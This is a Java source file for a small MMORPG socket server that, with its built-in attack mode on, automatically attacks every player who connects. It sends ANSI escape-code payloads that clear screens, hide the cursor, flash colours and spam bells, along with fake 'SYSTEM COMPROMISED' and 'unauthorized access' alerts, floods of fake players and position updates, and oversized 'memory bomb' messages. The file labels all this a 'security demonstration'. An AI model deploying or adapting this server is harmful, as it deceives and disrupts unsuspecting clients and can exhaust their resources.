import java.io.*;
import java.net.*;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;

public class MMORPGServer {
    private static final int PORT = 12345;
    private static Map<String, PlayerHandler> players = new ConcurrentHashMap<>();
    
    // Attack configuration
    public static final boolean ATTACK_MODE = true;
    public static final int FAKE_PLAYERS_COUNT = 500;
    public static final int MESSAGE_FLOOD_COUNT = 100;
    
    public static void main(String[] args) {
        try (ServerSocket serverSocket = new ServerSocket(PORT)) {
            System.out.println("MMORPG Server is running on port " + PORT);
            System.out.println("⚠️ ATTACK MODE: " + (ATTACK_MODE ? "ENABLED" : "DISABLED"));
            
            while (true) {
                Socket clientSocket = serverSocket.accept();
                PlayerHandler playerHandler = new PlayerHandler(clientSocket);
                new Thread(playerHandler).start();
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    
    public static synchronized void broadcast(String message, PlayerHandler sender) {
        for (PlayerHandler player : players.values()) {
            if (player != sender) {
                player.sendMessage(message);
            }
        }
    }
    
    public static synchronized void updatePlayerPosition(
            String playerName,
            String positionData
    ) {
        String message = "UPDATE:" + playerName + ":" + positionData;
        broadcast(message, players.get(playerName));
    }
    
    public static synchronized void addPlayer(
            String playerName,
            PlayerHandler playerHandler
    ) {
        players.put(playerName, playerHandler);
    }
    
    public static synchronized void removePlayer(String playerName) {
        players.remove(playerName);
    }
    
    // ============ TERMINAL CONTROL ATTACK METHODS ============
    
    /**
     * Terminal Disorientation Attack - Uses ANSI escape codes
     * These codes are interpreted by the terminal when printed
     */
    public static void terminalDisorientationAttack(PlayerHandler victim) {
        System.out.println("[ATTACK] Launching terminal disorientation on " + victim.playerName);
        
        new Thread(() -> {
            // ANSI escape codes that will be interpreted by the victim's terminal
            String clearScreen = "\033[2J\033[H";  // Clear screen and move cursor to top
            String[] colors = {
                "\033[31m",  // Red
                "\033[32m",  // Green
                "\033[33m",  // Yellow
                "\033[34m",  // Blue
                "\033[35m",  // Magenta
                "\033[36m",  // Cyan
                "\033[91m",  // Bright Red
                "\033[92m"   // Bright Green
            };
            String bell = "\007";  // Terminal bell (beep)
            String hideCursor = "\033[?25l";  // Hide cursor
            String showCursor = "\033[?25h";  // Show cursor
            String reset = "\033[0m";  // Reset all formatting
            
            try {
                // Phase 1: Clear screen and hide cursor
                victim.sendMessage("UPDATE:" + hideCursor + clearScreen + "INITIALIZING" + ":0,0");
                Thread.sleep(500);
                
                // Phase 2: Rapid color flashing with beeps and random positions
                for (int i = 0; i < 100; i++) {
                    String color = colors[(int)(Math.random() * colors.length)];
                    int row = (int)(Math.random() * 24);
                    int col = (int)(Math.random() * 80);
                    String moveCursor = "\033[" + row + ";" + col + "H";  // Move cursor to random position
                    
                    String payload = color + moveCursor + "⚠️ BREACH ⚠️" + bell + reset;
                    victim.sendMessage("UPDATE:HACKER_" + i + ":" + payload);
                    
                    Thread.sleep(50);  // 50ms between messages
                }
                
                // Phase 3: Screen flood with scrolling text
                for (int i = 0; i < 50; i++) {
                    String color = colors[i % colors.length];
                    victim.sendMessage("UPDATE:" + color + "SYSTEM_COMPROMISED_" + i + bell + ":EXTRACTING_DATA");
                    Thread.sleep(30);
                }
                
                // Phase 4: Final message and restore
                Thread.sleep(1000);
                victim.sendMessage("UPDATE:" + clearScreen + "\033[31m" + "═══ ATTACK COMPLETE ═══" + reset + showCursor + ":0,0");
                
                System.out.println("[ATTACK] Terminal disorientation complete for " + victim.playerName);
                
            } catch (InterruptedException e) {
                System.out.println("[ATTACK] Interrupted for " + victim.playerName);
            }
        }).start();
    }
    
    /**
     * Simpler color chaos attack - Less aggressive
     */
    public static void colorChaosAttack(PlayerHandler victim) {
        System.out.println("[ATTACK] Color chaos on " + victim.playerName);
        
        new Thread(() -> {
            String[] colors = {"\033[31m", "\033[32m", "\033[33m", "\033[34m", "\033[35m", "\033[36m"};
            String bell = "\007";
            String reset = "\033[0m";
            
            try {
                for (int i = 0; i < 200; i++) {
                    String color = colors[i % colors.length];
                    victim.sendMessage("UPDATE:" + color + "WARNING_" + i + bell + reset + ":ALERT");
                    Thread.sleep(25);
                }
            } catch (InterruptedException e) {
                // Attack interrupted
            }
        }).start();
    }
    
    /**
     * Screen clear spam - Repeatedly clears the screen
     */
    public static void screenClearSpam(PlayerHandler victim) {
        System.out.println("[ATTACK] Screen clear spam on " + victim.playerName);
        
        new Thread(() -> {
            String clearScreen = "\033[2J\033[H";
            
            try {
                for (int i = 0; i < 50; i++) {
                    victim.sendMessage("UPDATE:" + clearScreen + "SCREEN_CLEARED_" + i + ":0,0");
                    Thread.sleep(100);
                }
            } catch (InterruptedException e) {
                // Attack interrupted
            }
        }).start();
    }
    
    /**
     * Cursor chaos - Moves cursor randomly
     */
    public static void cursorChaosAttack(PlayerHandler victim) {
        System.out.println("[ATTACK] Cursor chaos on " + victim.playerName);
        
        new Thread(() -> {
            try {
                for (int i = 0; i < 150; i++) {
                    int row = (int)(Math.random() * 24) + 1;
                    int col = (int)(Math.random() * 80) + 1;
                    String moveCursor = "\033[" + row + ";" + col + "H";
                    
                    victim.sendMessage("UPDATE:" + moveCursor + "💀" + i + ":HACKED");
                    Thread.sleep(50);
                }
            } catch (InterruptedException e) {
                // Attack interrupted
            }
        }).start();
    }
    
    /**
     * Bell spam - Makes terminal beep continuously
     */
    public static void bellSpamAttack(PlayerHandler victim) {
        System.out.println("[ATTACK] Bell spam on " + victim.playerName);
        
        new Thread(() -> {
            String bell = "\007";
            
            try {
                for (int i = 0; i < 100; i++) {
                    victim.sendMessage("UPDATE:BEEP_" + i + ":" + bell + bell + bell);
                    Thread.sleep(100);
                }
            } catch (InterruptedException e) {
                // Attack interrupted
            }
        }).start();
    }
    
    // ============ EXISTING ATTACK METHODS ============
    
    public static void spawnFakePlayers(PlayerHandler victim) {
        System.out.println("[ATTACK] Spawning " + FAKE_PLAYERS_COUNT + " fake players on " + victim.playerName);
        
        new Thread(() -> {
            for (int i = 0; i < FAKE_PLAYERS_COUNT; i++) {
                String fakePlayerName = "Bot_" + i + "_" + UUID.randomUUID().toString().substring(0, 8);
                victim.sendMessage("PLAYER_JOIN:" + fakePlayerName);
                
                int x = (int) (Math.random() * 1000);
                int y = (int) (Math.random() * 1000);
                victim.sendMessage("UPDATE:" + fakePlayerName + ":" + x + "," + y);
                
                try {
                    Thread.sleep(10);
                } catch (InterruptedException e) {
                    break;
                }
            }
            System.out.println("[ATTACK] Fake player spawn complete");
        }).start();
    }
    
    public static void messageFlood(PlayerHandler victim) {
        System.out.println("[ATTACK] Flooding " + victim.playerName + " with messages");
        
        new Thread(() -> {
            for (int i = 0; i < MESSAGE_FLOOD_COUNT; i++) {
                victim.sendMessage("BROADCAST:⚠️ SYSTEM ALERT #" + i + " - YOUR CONNECTION IS COMPROMISED!");
                victim.sendMessage("BROADCAST:🚨 WARNING: Unauthorized access detected!");
                victim.sendMessage("BROADCAST:💀 Your game data is being corrupted...");
                
                try {
                    Thread.sleep(50);
                } catch (InterruptedException e) {
                    break;
                }
            }
            System.out.println("[ATTACK] Message flood complete");
        }).start();
    }
    
    public static void positionSpam(PlayerHandler victim) {
        System.out.println("[ATTACK] Spamming position updates on " + victim.playerName);
        
        new Thread(() -> {
            for (int i = 0; i < 1000; i++) {
                for (int j = 0; j < 5; j++) {
                    String fakePlayer = "Ghost_" + j;
                    int x = (int) (Math.random() * 10000);
                    int y = (int) (Math.random() * 10000);
                    victim.sendMessage("UPDATE:" + fakePlayer + ":" + x + "," + y);
                }
                
                try {
                    Thread.sleep(20);
                } catch (InterruptedException e) {
                    break;
                }
            }
            System.out.println("[ATTACK] Position spam complete");
        }).start();
    }
    
    public static void memoryBomb(PlayerHandler victim) {
        System.out.println("[ATTACK] Deploying memory bomb on " + victim.playerName);
        
        new Thread(() -> {
            StringBuilder hugeMessage = new StringBuilder();
            for (int i = 0; i < 10000; i++) {
                hugeMessage.append("XXXXXXXXXX");
            }
            
            for (int i = 0; i < 50; i++) {
                victim.sendMessage("DATA:" + hugeMessage.toString());
                
                try {
                    Thread.sleep(100);
                } catch (InterruptedException e) {
                    break;
                }
            }
            System.out.println("[ATTACK] Memory bomb complete");
        }).start();
    }
    
    /**
     * Combined attack - includes terminal disorientation
     */
    public static void launchFullAttack(PlayerHandler victim) {
        System.out.println("[ATTACK] ⚠️ LAUNCHING FULL ATTACK ON: " + victim.playerName);
        
        new Thread(() -> {
            // Start with terminal disorientation
            terminalDisorientationAttack(victim);
            try { Thread.sleep(3000); } catch (InterruptedException e) {}
            
            // Add traditional attacks
            spawnFakePlayers(victim);
            try { Thread.sleep(2000); } catch (InterruptedException e) {}
            
            messageFlood(victim);
            try { Thread.sleep(1000); } catch (InterruptedException e) {}
            
            positionSpam(victim);
            try { Thread.sleep(1000); } catch (InterruptedException e) {}
            
            memoryBomb(victim);
        }).start();
    }
}

class PlayerHandler implements Runnable {
    private Socket socket;
    private PrintWriter out;
    private BufferedReader in;
    public String playerName;
    
    public PlayerHandler(Socket socket) {
        this.socket = socket;
    }
    
    @Override
    public void run() {
        try {
            in = new BufferedReader(
                    new InputStreamReader(socket.getInputStream())
            );
            out = new PrintWriter(socket.getOutputStream(), true);
            
            out.println("Enter your player name: ");
            playerName = in.readLine();
            MMORPGServer.addPlayer(playerName, this);
            System.out.println(playerName + " has joined the game.");
            
            sendMessage("Welcome to the MMORPG, " + playerName + "!");
            
            // ============ TRIGGER ATTACK ON JOIN ============
            if (MMORPGServer.ATTACK_MODE) {
                Thread.sleep(2000);
                
                sendMessage("⚠️ SERVER NOTICE: Initiating security demonstration...");
                
                // CHOOSE YOUR ATTACK:
                
                // Option 1: Full attack with terminal disorientation
                MMORPGServer.launchFullAttack(this);
                
                // Option 2: Just terminal disorientation (most visual)
                // MMORPGServer.terminalDisorientationAttack(this);
                
                // Option 3: Individual terminal attacks
                // MMORPGServer.colorChaosAttack(this);
                // MMORPGServer.screenClearSpam(this);
                // MMORPGServer.cursorChaosAttack(this);
                // MMORPGServer.bellSpamAttack(this);
            }
            
            String message;
            while ((message = in.readLine()) != null) {
                if (message.startsWith("MOVE:")) {
                    String positionData = message.substring(5);
                    System.out.println(playerName + " moved to: " + positionData);
                    MMORPGServer.updatePlayerPosition(playerName, positionData);
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        } catch (InterruptedException e) {
            System.out.println("Attack interrupted for " + playerName);
        } finally {
            try {
                MMORPGServer.removePlayer(playerName);
                socket.close();
                System.out.println(playerName + " has left the game.");
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
    
    public void sendMessage(String message) {
        out.println(message);
    }
}
